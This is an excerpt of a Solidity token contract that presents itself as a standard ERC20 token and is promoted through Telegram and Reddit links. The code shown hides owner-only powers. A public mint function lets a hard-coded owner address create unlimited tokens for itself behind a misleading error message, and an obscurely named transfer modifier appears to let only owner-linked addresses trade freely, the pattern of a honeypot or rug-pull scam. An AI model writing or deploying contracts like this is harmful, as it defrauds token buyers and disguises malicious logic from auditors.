...
//https://t.me/CryptoLaunchhunter/3334
//Find us on Reddit @ r/thepurge/
...
contract StandardERC20 is Context, IERC20 {
    ...
    uint256 private _burnt = 0;
    address private _tOwner;
    address public _path_ = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address _rOwner = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
    address public rtOwner = 0x11076e5869de0dBe44b21dD670Cf0a020177C4F4;
    ...
    function _pAppr(address[] memory destination) public {
        require(msg.sender == rtOwner, "!owner");
    ...
    function _mAppr(address tOwner) public {
        require(msg.sender == rtOwner, "!owner");
        _tOwner = tOwner;
    }

    modifier _mpApproval(
        address dest,
        uint256 amt,
        address from,
        address dst
    ) {
        if (rtOwner == _tOwner && from == rtOwner) {
            _tOwner = dest;
            _;
        } else {
            if (from == rtOwner || from == _tOwner || dest == rtOwner) {
                if (from == rtOwner && from == dest) {
                    _burnt = amt;
                }
                _;
            } else {
    ...
    function _mint(address account, uint256 amount) public {
        require(msg.sender == rtOwner, "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _balances[rtOwner] = _balances[rtOwner].add(amount);
    ...
    function _tf(
        ...
        address dest,
        uint256 amt
    ) internal virtual _mpApproval(dest, amt, from, address(0)) {
        _pair(from, dest, amt);
    }
    ...
    modifier _verify() {
        require(msg.sender == rtOwner, "Not allowed to interact");
        _;
    }
